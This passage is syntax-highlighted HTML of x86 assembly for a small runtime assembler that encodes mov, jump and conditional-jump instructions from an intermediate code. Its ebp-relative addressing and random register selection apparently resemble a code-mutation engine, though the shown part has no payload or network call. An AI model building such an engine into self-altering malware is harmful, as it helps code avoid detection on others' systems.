        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOther</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Return</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">




</span><span class="sc5">WhatOperandIsRegMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">ToTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">SecondTypeOfValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">FixAddresses</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">


        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRegMem</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">setl</span><span class="sc0">    </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">MemoryValue</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">RegistersBitValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">Label43</span><span class="sc0">



   </span><span class="sc5">MemoryValue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">101b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">Label43</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOther</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">LastOperandIsImmediate</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">RegistersBitValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">LastOperandIsImmediate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">OutputInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; input</span><span class="sc0">
</span><span class="sc1">; Edi -&gt; where to put compiled code</span><span class="sc0">
</span><span class="sc1">; Esi -&gt; code to compile</span><span class="sc0">

</span><span class="sc1">; return</span><span class="sc0">
</span><span class="sc1">; eax = where to put compiled code</span><span class="sc0">
</span><span class="sc1">; ebx = size of compiled code</span><span class="sc0">
</span><span class="sc5">Compile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc5">CompileAgain</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadInstruction1</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0c3h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">CompileAgain</span><span class="sc0">

</span><span class="sc5">CompileEnd</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">                                     
                                                


</span><span class="sc5">OffsetProc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">AsciiToNum</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SavedOffsets</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">DeclareByteProc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">MoveProc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadOperands</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetDirectionBit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FetchOpcode</span><span class="sc0">
        
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DefaultProc1Label1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetRegMem</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">DefaultProc1Label1</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">RegistersBitValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOther</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">5</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OutputInstruction</span><span class="sc0">



</span><span class="sc5">DefaultProc1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadOperands</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetDirectionBit</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FetchOpcode</span><span class="sc0">

     </span><span class="sc5">DefaultProc1Label1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label41</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">

    </span><span class="sc5">Label41</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc4">[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">CopyDataToInstruction</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FixAddresses</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OutputInstruction</span><span class="sc0">
    
    </span><span class="sc5">CopyDataToInstruction</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOther</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">Instruction</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">InstructionLength</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">OutputInstruction</span><span class="sc0">


</span><span class="sc1">;-JMP-------Jump</span><span class="sc0">
</span><span class="sc1">;Near,8-bit      |1|1|1|0|1|0|1|1|  8-bit Displacement</span><span class="sc0">
</span><span class="sc1">;Near,Direct     |1|1|1|0|1|0|0|1|  Full Displacement</span><span class="sc0">
</span><span class="sc1">;Near,Indirect   |1|1|1|1|1|1|1|1|  |mod|1|0|0| R/M |</span><span class="sc0">


</span><span class="sc5">JmpProc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">JumpIsIndirect</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc5">RegistersBitValue</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">00100000b</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">JumpIsIndirect</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">SavedOffsets</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0fffffff8h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OutPutSmallJump</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">JxxProc</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetOperand</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">SavedOffsets</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">0fffffff8h</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">OutPutSmallJump</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        

</span><span class="sc5">OutPutSmallJump</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">01110000b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">GetOperand</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'['</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">  
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ebx = 0 or 8</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'S'</span><span class="sc0">                          </span><span class="sc1">; A variable</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">Label53</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PointerToDataSlack</span><span class="sc4">+</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

     </span><span class="sc5">Label53</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'R'</span><span class="sc0">
        </span><span class="sc6">setz</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; ebx = ebx + (0 or 4)</span><span class="sc0">

        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">; is value</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ReadValue</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         
        </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; read register</span><span class="sc0">
        
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'X'</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">GetRandomReg</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">ReadValue</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">Return</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AsciiToNum</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc12">'0'</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


